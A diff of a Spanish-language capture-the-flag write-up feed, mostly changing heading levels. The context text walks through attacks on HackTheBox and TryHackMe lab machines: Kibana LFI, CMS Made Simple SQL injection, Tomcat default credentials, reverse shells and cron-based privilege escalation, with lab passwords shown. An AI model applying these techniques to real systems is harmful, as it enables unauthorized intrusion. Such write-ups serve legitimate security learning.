@@ -4756,7 +4757,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 /index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h4 id=&#34;hint---imagen-&#34;&gt;Hint - Imagen&lt;/h4&gt;
+&lt;/div&gt;&lt;h3 id=&#34;hint---imagen&#34;&gt;Hint - Imagen&lt;/h3&gt;
 &lt;p&gt;Dentro de la imagen que se encuentra en el index del puerto 80 encontramos una cadena en base64 con lo que parece un hint.&lt;br /&gt;
 Imagen:&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_172727.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -4926,10 +4927,10 @@ Gobuster v2.0.1              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&
 pass: spanish.is.key
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;ssh---user-flag-&#34;&gt;SSH - User flag&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;ssh---user-flag&#34;&gt;SSH - User flag&lt;/h1&gt;
 &lt;p&gt;Ya que obtuvimos nuestras credenciales nos logeamos atravez del servicio ssh, obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_180413.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;kibana-642-&#34;&gt;Kibana 6.4.2&lt;/h2&gt;
+&lt;h2 id=&#34;kibana-642&#34;&gt;Kibana 6.4.2&lt;/h2&gt;
 &lt;p&gt;Como vimos anteriormente encontramos un alias .kibana el cual no era afectado en el puerto 9200, al obtener una shell pudimos hacer una enumeracion y encontrar el archivo de configuracion en este caso kibana.yml el cual se encuentra en la carpeta &lt;code&gt;/etc/kibana/&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Vemos que la configuracion de este archivo tiene otro puerto en el cual esta corriendo el &amp;lsquo;backend&amp;rsquo; de la aplicacion, pero este solo esta disponible en la maquina de manera local.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_181315.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -4946,7 +4947,7 @@ pass: spanish.is.key
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_181642.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Visitamos el puerto de manera local y nos muestra una plataforma, en este caso la de Kibana.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_181807.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;lfi---kibana-642-&#34;&gt;LFI - Kibana 6.4.2&lt;/h3&gt;
+&lt;h2 id=&#34;lfi---kibana-642&#34;&gt;LFI - Kibana 6.4.2&lt;/h2&gt;
 &lt;p&gt;Como lo dije anteriormente la version de Kibana 6.4.2 tiene una vulnerabilidad la cual permite ejecutar codigo mediante archivo javascript u obtener archivos mediante LFI, al explotar esta vulnerabilidad de LFI esta solo se ve reflejada dentro del archivo &amp;lsquo;log&amp;rsquo; de Kibana.&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&#34;&gt;&lt;strong&gt;Execute This&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/mpgn/CVE-2018-17246&#34;&gt;&lt;strong&gt;CVE-2018-17246&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
@@ -4996,7 +4997,7 @@ pass: spanish.is.key
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Por otro lado obtuvimos nuestra shell inversa como usuario Kibana:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_183604.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Para obtener una shell como usuario root primero enumeramos los crons que se ejecutan con el usuario root esto lo hacemos con pspy. Al realizar esto encontramos un proceso que se ejecuta cada minuto aproximadamente. Este proceso esta relacionado con logstash la cual es una herramienta que administra los logs.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190630_003942.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Al realizar una enumearcion de esta herramienta encontramos dentro de &lt;code&gt;/etc/logstash&lt;/code&gt; los archivos de configuracion de esta herramienta. Dentro de la carpeta &lt;code&gt;/etc/logstash/conf.d&lt;/code&gt; encontramos 3 archivos los cuales se utilizan para administrar logs.&lt;/p&gt;
@@ -5086,7 +5087,7 @@ pass: spanish.is.key
 &lt;p&gt;Por otro lado ponemos a la escucha netcat con el puerto que le pasamos a nuestra shell inversa, esperamos un poco a que se ejecute el cron de nuevo y obtenemos una shell como usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;Codigo de nuestra shelll inversa se ejecuta:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190630_010005.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;shell-usuario-root-&#34;&gt;Shell, usuario root:&lt;/h4&gt;
+&lt;h2 id=&#34;shell---root&#34;&gt;Shell - ROOT&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_232129.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 </content:encoded>
         <dc:creator>sckull</dc:creator>
@@ -5147,7 +5148,7 @@ pass: spanish.is.key
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -5179,7 +5180,7 @@ pass: spanish.is.key
 &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP##&lt;/h2&gt;
+&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos TCP/UDP.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -5243,19 +5244,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 17.79 seconds
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http---puerto-80-&#34;&gt;HTTP - Puerto 80&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http---puerto-80&#34;&gt;HTTP - Puerto 80&lt;/h1&gt;
 &lt;p&gt;Al visitar el puerto 80 en http nos muestra una pagina con un mensaje en el cual nos indica que la pagina tiene un script anti ddos.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_131024.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;robotstxt-&#34;&gt;Robots.txt&lt;/h4&gt;
+&lt;h2 id=&#34;robotstxt&#34;&gt;Robots.txt&lt;/h2&gt;
 &lt;p&gt;Intentamos utilizar gobuster, dirb y wfuzz para busqueda de directorios y archivos pero por el script que nos indica en la pagina principal no pudimos realizar dicha busqueda por lo que visitamos el archivo robots.txt de la pagina principal y nos muestra que esta &amp;ldquo;oculto&amp;rdquo; &lt;code&gt;/writeup/&lt;/code&gt;, al visitar esta pagina nos muestra una serie de writeups de maquinas que ya fueron retiradas de hackthebox.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_131244.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;cms-made-simple-&#34;&gt;CMS Made Simple&lt;/h3&gt;
+&lt;h1 id=&#34;cms-made-simple&#34;&gt;CMS Made Simple&lt;/h1&gt;
 &lt;p&gt;Utilizamos la extension para firefox &lt;code&gt;Wappalyzer&lt;/code&gt; la cual nos ayuda a identificar el tipo de CMS, Web Server, Programming Language y Operating Ssytem de una pagina web. Al utilizar esta extension en la pagina nos muestra lo mencionado anteriormente.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_170512.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Sabiendo esto buscamos exploits que puedan afectar a este CMS con Searchsploit.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_170708.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Encontramos varios exploits que afectan a este CMS cada uno de ellos en distintas versiones y tipos de vulnerabilidad, para esta version utilizamos &lt;code&gt;CMS Made Simple &amp;lt; 2.2.10 - SQL Injection&lt;/code&gt; (CVE-2019-9053).&lt;/p&gt;
-&lt;h2 id=&#34;cms-made-simple---sqli-&#34;&gt;CMS Made Simple - SQLI&lt;/h2&gt;
+&lt;h2 id=&#34;cms-made-simple---sqli&#34;&gt;CMS Made Simple - SQLI&lt;/h2&gt;
 &lt;p&gt;Utilizamos el exploit contra la pagina y nos muestra las credenciales del usuario jkr el salto de la contraseña y la contraseña.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_171931.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -5289,12 +5290,12 @@ Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;strong&gt;Contraseña crackeada:&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;ssh---user-&#34;&gt;SSH - User&lt;/h2&gt;
+&lt;h1 id=&#34;ssh---user&#34;&gt;SSH - User&lt;/h1&gt;
 &lt;p&gt;Cuando obtuvimos nuestra usuario y contraseña con el exploit la probamos en el panel de administracion del CMS que esta corriendo en el puerto 80 pero no tuvimos suerte de acceder por ese lado, por lo que utilizamos las credenciales en el servicio SSH y nos logeamos satisfactoriamente.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_233858.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Flag user.txt:&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_234021.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Utilizamos pspy para observar los procesos que se ejecutan, encontramos que un proceso se ejecuta a cada vez que se inicia sesion en el servicio de SSH.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190705_210432.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Vemos que este proceso env donde se le pasa la variable &lt;code&gt;$PATH&lt;/code&gt; del usuario root, luego de eso ejecuta un comando:&lt;/p&gt;
@@ -5388,7 +5389,7 @@ Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/develpy/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -5415,7 +5416,7 @@ Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;masscan--nmap-&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos udp/tcp y sus servicios.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -5604,7 +5605,7 @@ Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;
 &lt;/div&gt;&lt;h2 id=&#34;python-input-&#34;&gt;PYTHON INPUT&lt;/h2&gt;
 &lt;p&gt;En el puerto 10000 encontramos un script que nos pide un numero para poder enviar ese numero de paquetes al localhost.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/develpy/Screenshot%20from%202019-09-03%2017.45.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;king---user-&#34;&gt;KING - USER&lt;/h2&gt;
+&lt;h1 id=&#34;king---user&#34;&gt;KING - USER&lt;/h1&gt;
 &lt;p&gt;Le pasamos codigo python para ejecucion de comandos y vemos el resultado del comando enviado.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -5641,10 +5642,10 @@ Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;king:c00ffe123!
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;ssh---king-&#34;&gt;SSH - KING&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;ssh---king&#34;&gt;SSH - KING&lt;/h1&gt;
 &lt;p&gt;Nos logeamos con las credenciales que encontramos en la imagen y obtenemos acceso con el usuario king nuevamente.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/develpy/Screenshot%20from%202019-09-03%2018.01.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Utilizamos pspy para ver los cronjobs que se ejecuta, vemos que el usuario root ejecuta el archivo &lt;code&gt;root.sh&lt;/code&gt; y &lt;code&gt;run.sh&lt;/code&gt; que se encuentra en la carpeta principal del usuario king.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/develpy/Screenshot%20from%202019-09-03%2018.23.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Cambiamos el nombre del archivo root.sh a root.sh.bak y creamos un nuevo archivo con nuestra shell inversa.&lt;/p&gt;
@@ -5659,7 +5660,7 @@ Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/develpy/Screenshot%20from%202019-09-03%2018.29.05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Obtenemos una shell inversa con el usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/develpy/Screenshot%20from%202019-09-03%2018.33.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;alternative-root---django-&#34;&gt;ALTERNATIVE ROOT - DJANGO&lt;/h2&gt;
+&lt;h1 id=&#34;alternative-root---django&#34;&gt;ALTERNATIVE ROOT - DJANGO&lt;/h1&gt;
 &lt;p&gt;Encontramos que en el puerto 8080 esta corriendo un servicio de python o una pagina de django, como pudimos observar en la lista de pspy. Utilizamos ssh para traer localmente el puerto 8080 con las credenciales del usuario King.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/develpy/Screenshot%20from%202019-09-03%2018.37.23.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Encontramos una pagina escrita en django en la cual se puede enviar un archivo de python.&lt;br /&gt;
@@ -5741,7 +5742,7 @@ Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/thompson/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -5768,7 +5769,7 @@ Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;masscan--nmap-&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos udp/tcp y sus servicios.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -5817,7 +5818,7 @@ PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 60:c8:40🆎b0:09:84:3d:46:64:61:13:fa:bc:1f:be &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 8080/tcp open  http    Apache Tomcat 8.5.5
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-favicon: Apache Tomcat
@@ -5828,19 +5829,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Sep  3 05:34:26 2019 -- 1 IP address (1 host up) scanned in 14.01 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http---puerto-8080-&#34;&gt;HTTP - PUERTO 8080&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http---puerto-8080&#34;&gt;HTTP - PUERTO 8080&lt;/h1&gt;
 &lt;p&gt;Pagina en el puerto 8080 nos muestra que esta corriendo thompson.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/thompson/Screenshot%20from%202019-09-03%2003.28.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;tomcat---default-credentials-&#34;&gt;TOMCAT - DEFAULT CREDENTIALS&lt;/h4&gt;
+&lt;h2 id=&#34;tomcat---default-credentials&#34;&gt;TOMCAT - DEFAULT CREDENTIALS&lt;/h2&gt;
 &lt;p&gt;Utilizamos las credenciales por default y el panel de tomcat para iniciar sesion.&lt;/p&gt;
-&lt;h2 id=&#34;reverse-shell---jsp-&#34;&gt;REVERSE SHELL - JSP&lt;/h2&gt;
+&lt;h1 id=&#34;reverse-shell---jsp&#34;&gt;REVERSE SHELL - JSP&lt;/h1&gt;
 &lt;p&gt;Creamos nuestro payload con msfvenom y ponemos a la escucha metasploit.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/thompson/Screenshot%20from%202019-09-03%2003.33.08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Subimos nuestro archivo shell.war y al abrirlo se ejecutará nuestra shell.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/thompson/Screenshot%20from%202019-09-03%2003.36.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Obtenemos nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/thompson/Screenshot%20from%202019-09-03%2003.37.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Utilizamos pspy para ver los cronjobs que se ejecutan. Vemos un archivo que se ejecuta y este se encuentra en &lt;code&gt;/home/jack/id.sh&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/thompson/Screenshot%20from%202019-09-03%2003.41.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/thompson/Screenshot%20from%202019-09-03%2003.45.13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -5915,7 +5916,7 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -5947,7 +5948,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;masscan-&#34;&gt;MASSCAN&lt;/h2&gt;
+&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de todos los puertos tcp/udp.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -5975,8 +5976,7 @@ Discovered open port 80/tcp on 10.10.10.131
 Discovered open port 21/tcp on 10.10.10.131
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
-&lt;p&gt;Escaneo de puertos encontrados con MASSCAN.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Escaneo de puertos encontrados con MASSCAN.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 00:48 BST
 Nmap scan report for 10.10.10.131
 Host is up (0.22s latency).
@@ -5986,7 +5986,7 @@ PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
 | ssh-hostkey: 
 |   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
-|   256 41:e4:95:a3:39:0b:25:f9:da🇩🇪be:6a:dc:59:48:6d (ECDSA)
+|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
 |_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
 80/tcp  open  http     Node.js Express framework
 |_http-title: La Casa De Papel
@@ -6005,13 +6005,13 @@ Service Info: OS: Unix
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Agregamos lacasadepapel.htb a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;https-&#34;&gt;HTTPS&lt;/h2&gt;
+&lt;h1 id=&#34;https&#34;&gt;HTTPS&lt;/h1&gt;
 &lt;p&gt;Al visitar la pagina en https nos muestra un error de certificado.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2018.01.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Al visitar la pagina nos muestra una imagen QR.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-03-31%2023.41.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;ftp-&#34;&gt;FTP&lt;/h2&gt;
